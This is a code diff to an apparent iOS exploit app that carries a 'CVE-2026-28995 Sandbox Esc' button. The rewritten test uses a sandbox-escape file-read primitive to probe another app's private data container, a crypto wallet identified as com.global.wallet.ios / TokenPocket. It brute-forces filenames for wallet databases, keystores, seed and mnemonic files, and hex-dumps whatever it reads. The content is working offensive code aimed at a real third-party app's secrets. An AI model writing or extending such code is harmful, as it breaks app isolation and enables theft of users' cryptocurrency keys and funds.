@@ -664,7 +664,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *sbConf = [UIButtonConfiguration filledButtonConfiguration];
     sbConf.baseBackgroundColor = [UIColor systemTealColor];
     self.sandboxEscapeButton.configuration = sbConf;
-    [self.sandboxEscapeButton setTitle:@"CVE-2026-28995 Sandbox Esc v23" forState:UIControlStateNormal];
+    [self.sandboxEscapeButton setTitle:@"CVE-2026-28995 Sandbox Esc v24" forState:UIControlStateNormal];
     [self.sandboxEscapeButton addTarget:self action:@selector(sandboxEscapeTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.sandboxEscapeButton];
 
@@ -7377,168 +7377,141 @@ static void *iohid_threadCopyEvent(void *arg) {
         [log appendFormat:@"  ProductBuildVersion: %@\n", sv[@"ProductBuildVersion"]];
     }
     // Test 11: stat() + comprehensive sweep + creative paths (v23)
-    [log appendString:@"\n--- Test 11: stat() + exhaustive sweep (v23) ---\n"];
+    // Test 11: Probe INSIDE com.global.wallet.ios subdir (v24)
+    [log appendString:@"\n--- Test 11: Probe bundle ID subdirectory (v24) ---\n"];
     NSString *tpUUID = @"0D926318-FE07-4B1D-8A4B-5278C4E380D5";
     NSString *tpBase = [NSString stringWithFormat:
         @"var/mobile/Containers/Data/Application/%@", tpUUID];
 
-    // === Part A: stat() on known dirs ===
-    [log appendString:@"\n[Part A] stat() on known dirs:\n"];
-    NSArray *statPaths = @[
-        tpBase,
-        [tpBase stringByAppendingPathComponent:@"Documents"],
-        [tpBase stringByAppendingPathComponent:@"Documents/db"],
-        [tpBase stringByAppendingPathComponent:@"Library"],
-        [tpBase stringByAppendingPathComponent:@"Library/Preferences"],
-        [tpBase stringByAppendingPathComponent:@"Library/Caches"],
-        [tpBase stringByAppendingPathComponent:@"Library/Application Support"],
-    ];
-    for (NSString *sp in statPaths) {
-        NSString *p = TRYFILE(sp);
-        struct stat st;
-        int rc = lstat([p UTF8String], &st);
-        if (rc == 0) {
-            [log appendFormat:@"  [+] %@: mode=0%o size=%lld ino=%llu\n",
-                [sp lastPathComponent], st.st_mode, (long long)st.st_size,
-                (unsigned long long)st.st_ino];
-        } else {
-            [log appendFormat:@"  [-] %@: errno=%d\n", [sp lastPathComponent], errno];
-        }
+    // v23 found: Library/Caches/com.global.wallet.ios is a DIRECTORY (224 bytes)!
+    NSString *bundleDir = [tpBase stringByAppendingPathComponent:
+        @"Library/Caches/com.global.wallet.ios"];
+
+    // === Part A: Verify the directory and stat it ===
+    [log appendString:@"\n[Part A] Verify bundle ID directory:\n"];
+    probeFile(@"Library/Caches/com.global.wallet.ios", log);
+    NSString *p = TRYFILE(@"var/mobile/Containers/Data/Application/0D926318-FE07-4B1D-8A4B-5278C4E380D5/Library/Caches/com.global.wallet.ios");
+    struct stat st;
+    if (lstat([p UTF8String], &st) == 0) {
+        [log appendFormat:@"  [+] stat: mode=0%o size=%lld ino=%llu\n",
+            st.st_mode, (long long)st.st_size, (unsigned long long)st.st_ino];
     }
 
-    // === Part B: NSFileManager attributes ===
-    [log appendString:@"\n[Part B] NSFileManager attributes:\n"];
-    for (NSString *sp in statPaths) {
-        NSString *p = TRYFILE(sp);
-        NSError *err = nil;
-        NSDictionary *attrs = [[NSFileManager defaultManager] attributesOfItemAtPath:p error:&err];
-        if (attrs) {
-            [log appendFormat:@"  [+] %@: type=%@ size=%@ mod=%@ ref=%@\n",
-                [sp lastPathComponent],
-                attrs[NSFileType],
-                attrs[NSFileSize],
-                attrs[NSFileModificationDate],
-                attrs[NSFileReferenceCount]];
-        }
-    }
-
-    // === Part C: Documents/db/ short name sweep ===
-    [log appendString:@"\n[Part C] Short name sweep in Documents/db/:\n"];
-    NSString *dbDir = [tpBase stringByAppendingPathComponent:@"Documents/db"];
-    // Single a-z
-    for (char c = 'a'; c <= 'z'; c++)
-        probeFile([dbDir stringByAppendingPathComponent:[NSString stringWithFormat:@"%c", c]], log);
-    // Single 0-9
-    for (char c = '0'; c <= '9'; c++)
-        probeFile([dbDir stringByAppendingPathComponent:[NSString stringWithFormat:@"%c", c]], log);
-    // Two-char important combos
-    NSArray *twoChar = @[@"db",@"tp",@"bt",@"tr",@"et",@"so",@"po",@"ap",@"op",
-        @"ar",@"su",@"av",@"fa",@"ne",@"al",@"li",@"do",@"ri",@"co",
-        @"bs",@"bn",@"mt",@"at",@"ho",@"sc",@"sv",@"se",@"si",@"su",
-        @"lt",@"l1",@"m1",@"n1",@"kt",@"kp",@"hd",@"hw",@"ms",@"mm",
-        @"tx",@"wc",@"wk",@"wl",@"wt",@"df",@"dt",@"dx",@"dy",@"dz"];
-    for (NSString *n in twoChar) {
-        probeFile([dbDir stringByAppendingPathComponent:n], log);
-        probeFile([dbDir stringByAppendingPathComponent:[n uppercaseString]], log);
-    }
-
-    // === Part D: Blockchain names + smart extensions ===
-    [log appendString:@"\n[Part D] Blockchain-specific names:\n"];
-    NSArray *chains = @[
-        @"tron",@"TRON",@"Tron",
-        @"ethereum",@"Ethereum",@"eth",@"ETH",
-        @"bitcoin",@"Bitcoin",@"btc",@"BTC",
-        @"solana",@"Solana",@"sol",@"SOL",
-        @"bsc",@"BSC",@"binance",@"Binance",
-        @"polygon",@"Polygon",@"matic",@"MATIC",
-        @"aptos",@"Aptos",@"apt",@"APT",
-        @"sui",@"Sui",@"SUI",
-        @"cosmos",@"Cosmos",@"atom",@"ATOM",
-        @"optimism",@"Optimism",
-        @"arbitrum",@"Arbitrum",
-        @"avalanche",@"Avalanche",@"avax",@"AVAX",
-        @"fantom",@"Fantom",@"ftm",@"FTM",
-        @"near",@"Near",@"NEAR",
-        @"ton",@"TON",@"Ton",
-        @"ripple",@"Ripple",@"xrp",@"XRP",
-        @"litecoin",@"Litecoin",@"ltc",@"LTC",
-        @"dogecoin",@"Dogecoin",@"doge",@"DOGE",
-    ];
-    NSArray *cex = @[@".db",@".sqlite",@".sqlite3",@".encrypted",@".sqlcipher",
-        @".dat",@".data",@".bin",@".realm",@""];
-    for (NSString *cn in chains)
-        for (NSString *ce in cex)
-            probeFile([dbDir stringByAppendingPathComponent:[NSString stringWithFormat:@"%@%@", cn, ce]], log);
-
-    // === Part E: Creative filenames across ALL likely directories ===
-    [log appendString:@"\n[Part E] Cross-directory creative sweep:\n"];
-    NSArray *alldirs = @[@"Documents/db/", @"Library/", @"Library/Caches/",
-        @"Library/Preferences/", @"Documents/"];
-    NSArray *creative = @[
-        // SQLite.swift defaults
-        @"db",@"database",@"Database",@"data",@"Data",
-        // Class-based names
-        @"WalletDB",@"walletdb",@"wallet_db",@"wallet",
-        @"HDWalletDB",@"hdwallet",@"hd_wallet",
-        @"KeyPalDB",@"keypal",@"KeyPal",@"keypal_db",
-        @"KeyPalWalletDB",@"keypal_wallet",
-        @"WalletOrderDB",@"wallet_order",
-        @"WalletTokenDB",@"wallet_token",
-        @"MSTransactionDB",@"ms_transaction",
-        @"NotificationDB",@"notification",
-        @"CardDB",@"card",
-        @"LocalTXDB",@"local_tx",
-        @"CacheDB",@"cache_db",
-        // App/bundle based
-        @"Global_Wallet",@"global_wallet",@"GlobalWallet",@"globalwallet",
-        @"TokenPocket",@"tokenpocket",@"TOKENPOCKET",
-        @"com.global.wallet.ios",
-        // Common SQLite names
+    // === Part B: Probe all standard DB names inside bundleDir ===
+    [log appendString:@"\n[Part B] Standard DB names inside bundle ID dir:\n"];
+    NSArray *dbNames = @[
+        @"wallet",@"Wallet",@"WALLET",@"walletdb",@"WalletDB",
+        @"tp",@"TP",@"tokenpocket",@"TokenPocket",
+        @"data",@"Data",@"database",@"Database",
         @"main",@"Main",@"app",@"App",@"store",@"Store",
-        @"storage",@"Storage",@"local",@"Local",
-        @"config",@"Config",@"settings",@"Settings",
-        @"accounts",@"Accounts",@"account",@"Account",
-        @"tokens",@"Tokens",@"token",@"Token",
-        @"transactions",@"Transactions",@"tx",@"TX",@"txs",
-        @"contacts",@"Contacts",@"contact",@"Contact",
-        @"addresses",@"Addresses",@"address",@"Address",
-        @"multisig",@"MultiSig",@"ms",
-        @"hardware",@"Hardware",@"hw",
-        @"keystore",@"KeyStore",@"keystore",
-        @"seed",@"Seed",@"mnemonic",@"Mnemonic",
-        @"key",@"Key",@"keys",@"Keys",
-        // Underscore variants
-        @"wallet_data",@"walletData",@"WalletData",
-        @"user_data",@"userData",@"UserData",
-        @"app_data",@"appData",@"AppData",
-        @"chain_data",@"chainData",@"ChainData",
-        @"token_data",@"tokenData",@"TokenData",
-        // Number variants
-        @"db0",@"db1",@"db2",@"data0",@"data1",@"data2",
-        @"v1",@"v2",@"v3",@"v2_0",@"v2.0",
-        // Short codes
-        @"w",@"W",@"t",@"T",@"k",@"K",@"h",@"H",
-        @"d",@"D",@"s",@"S",@"c",@"C",@"m",@"M",
+        @"storage",@"Storage",@"global",@"Global",
+        @"keypal",@"KeyPal",@"hdwallet",@"HDWallet",
+        @"tron",@"TRON",@"eth",@"ETH",@"btc",@"BTC",
+        @"sol",@"SOL",@"bsc",@"BSC",@"polygon",@"Polygon",
+        @"accounts",@"tokens",@"transactions",@"tx",
+        @"contacts",@"settings",@"config",@"cache",
+        @"multisig",@"ms",@"hardware",@"hw",
+        @"seed",@"mnemonic",@"keystore",
+        @"local",@"Local",@"user",@"User",
+        @"default",@"Default",
     ];
-    NSArray *cext = @[@".db",@".sqlite",@".sqlite3",@".encrypted",@".sqlcipher",
-        @".dat",@".data",@".bin",@".realm",@".json",@""];
-    for (NSString *dir in alldirs)
-        for (NSString *nm in creative)
-            for (NSString *ex in cext)
-                probeFile([tpBase stringByAppendingPathComponent:
-                    [NSString stringWithFormat:@"%@%@%@", dir, nm, ex]], log);
+    NSArray *dbExts = @[@".db",@".sqlite",@".sqlite3",@".encrypted",@".sqlcipher",
+        @".dat",@".data",@".bin",@".realm",@".json",@".plist",@""];
+    for (NSString *nm in dbNames)
+        for (NSString *ex in dbExts)
+            probeFile([bundleDir stringByAppendingPathComponent:
+                [NSString stringWithFormat:@"%@%@", nm, ex]], log);
 
-    // === Part F: Try alternate TP data container UUIDs ===
-    [log appendString:@"\n[Part F] Scan for alternate TP container UUIDs:\n"];
-    // Check if the installed app list reveals a different data UUID
-    probeFile(@"var/containers/Bundle/Application/97028E76-0192-4651-BF43-3BFCAC8D9BA9/Global Wallet.app/Info.plist", log);
-    // Check iTunesMetadata.plist (may contain install info)
-    NSString *tpBundle = @"var/containers/Bundle/Application/97028E76-0192-4651-BF43-3BFCAC8D9BA9/Global Wallet.app";
-    probeFile([tpBundle stringByAppendingPathComponent:@"iTunesMetadata.plist"], log);
-    // Try reading the .com.apple.mobile_container_manager.metadata.plist via bundle path
-    probeFile(@"var/containers/Bundle/Application/97028E76-0192-4651-BF43-3BFCAC8D9BA9/.com.apple.mobile_container_manager.metadata.plist", log);
-    // Check if there's a data container UUID embedded anywhere
-    probeFile(@"var/mobile/Containers/Data/Application/.com.apple.mobile_container_manager.metadata.plist", log);
+    // === Part C: Short names inside bundle ID dir ===
+    [log appendString:@"\n[Part C] Short names inside bundle ID dir:\n"];
+    for (char c = 'a'; c <= 'z'; c++)
+        probeFile([bundleDir stringByAppendingPathComponent:
+            [NSString stringWithFormat:@"%c", c]], log);
+    for (char c = '0'; c <= '9'; c++)
+        probeFile([bundleDir stringByAppendingPathComponent:
+            [NSString stringWithFormat:@"%c", c]], log);
+    for (NSString *n in @[@"db",@"tp",@"bt",@"tr",@"et",@"so",@"po",@"ap",
+        @"kt",@"kp",@"hd",@"hw",@"ms",@"mm",@"tx",@"wc",@"wk",@"wl",
+        @"wt",@"lt",@"l1",@"m1",@"n1",@"bs",@"bn",@"at",@"ho",@"sc"])
+        probeFile([bundleDir stringByAppendingPathComponent:n], log);
+
+    // === Part D: Probe for subdirectories inside bundle ID dir ===
+    [log appendString:@"\n[Part D] Subdirectory check inside bundle ID dir:\n"];
+    // Check if there are nested subdirs (like per-blockchain)
+    for (NSString *n in @[@"tron",@"TRON",@"eth",@"ETH",@"btc",@"BTC",
+        @"sol",@"SOL",@"bsc",@"BSC",@"polygon",@"aptos",@"sui",
+        @"database",@"db",@"data",@"cache",@"tmp",@"files",
+        @"Cosmos",@"Optimism",@"Arbitrum",@"Fantom",@"Near",
+        @"THOR",@"Litecoin",@"Bitcoin",@"Ethereum",@"Solana"])
+        probeFile([bundleDir stringByAppendingPathComponent:n], log);
+
+    // === Part E: Also check for similar subdirs in Library/Caches ===
+    [log appendString:@"\n[Part E] Search for other subdirs in Library/Caches:\n"];
+    // Library/Caches has ref=10, so there are other subdirectories
+    for (NSString *n in @[@"com.global.wallet",@"Global_Wallet",
+        @"group.com.tpwallet.wc",@"group.com.tp.wallet.wc",
+        @"group.shared.tpwallet.internal",@"com.tokenpocket",
+        @"tokenpocket",@"TPWallet",@"wallet",@"database",
+        @"KeyPal",@"HDWallet",@"Multisig",@"tron",@"eth",
+        @"btc",@"solana",@"Cache",@"cache",@"data",@"db",
+        @"files",@"Documents",@"Library",@"tmp",@"temp",
+        @"com.apple",@"apple",@"com.google",@"google",
+        @"com.facebook",@"facebook",@"com.alibaba",
+        @"Firebase",@"firebase",@"Analytics",@"analytics"])
+        probeFile([tpBase stringByAppendingPathComponent:
+            [NSString stringWithFormat:@"Library/Caches/%@", n]], log);
+
+    // === Part F: Try to read from the bundle ID dir as raw data ===
+    [log appendString:@"\n[Part F] Attempt raw directory read:\n"];
+    NSData *rawDir = [NSData dataWithContentsOfFile:p];
+    [log appendFormat:@"  raw dir read: %@ (%llu bytes)\n",
+        rawDir ? @"GOT DATA" : @"nil", (unsigned long long)rawDir.length];
+    if (rawDir && rawDir.length > 0) {
+        // Dump first 512 bytes as hex
+        NSMutableString *hex = [NSMutableString string];
+        const unsigned char *b = rawDir.bytes;
+        NSUInteger len = MIN(512, rawDir.length);
+        for (NSUInteger i = 0; i < len; i++) {
+            [hex appendFormat:@"%02x", b[i]];
+            if ((i+1)%64==0) [hex appendString:@"\n"];
+        }
+        [log appendFormat:@"  hex:\n%@\n", hex];
+        // Try to extract any ASCII strings
+        NSMutableString *asc = [NSMutableString string];
+        for (NSUInteger i = 0; i < len; i++)
+            [asc appendFormat:@"%c", (b[i]>=0x20&&b[i]<0x7f)?b[i]:'.'];
+        [log appendFormat:@"  ascii: %@\n", asc];
+    }
+
+    // === Part G: Final broad sweep of com.global.wallet.ios dir ===
+    [log appendString:@"\n[Part G] Broad sweep inside bundle ID dir:\n"];
+    NSArray *broadNames = @[
+        @"WalletDB",@"walletdb",@"WalletDb",
+        @"HDWalletDB",@"hdwalletdb",@"HdWalletDB",
+        @"KeyPalDB",@"keypal",@"KeyPal",@"KeyPalWalletDB",
+        @"WalletOrderDB",@"walletorder",
+        @"WalletTokenDB",@"wallettoken",
+        @"MSTransactionDB",@"mstransaction",
+        @"NotificationDB",@"notification",
+        @"LocalTXDB",@"localtx",
+        @"CacheDB",@"cachedb",
+        @"PendingDB",@"ConfirmedDB",@"AlertDB",
+        @"CardDB",@"carddb",
+        @"data",@"Data",@"DATA",
+        @"main",@"Main",@"MAIN",
+        @"db",@"DB",@"Db",
+        @"sqlite",@"SQLite",@"SQLITE",
+        @"sqlcipher",@"SQLCipher",
+        @"global_wallet",@"GlobalWallet",@"globalwallet",
+        @"tp",@"TP",@"tokenpocket",@"TokenPocket",@"TOKENPOCKET",
+        @"com.global.wallet.ios",
+        @"tron",@"TRON",@"eth",@"ETH",@"btc",@"BTC",@"sol",@"SOL",
+    ];
+    for (NSString *nm in broadNames)
+        for (NSString *ex in @[@".db",@".sqlite",@".sqlite3",@".encrypted",
+            @".sqlcipher",@"",@".dat",@".data",@".bin",@".realm"])
+            probeFile([bundleDir stringByAppendingPathComponent:
+                [NSString stringWithFormat:@"%@%@", nm, ex]], log);
 
 
 
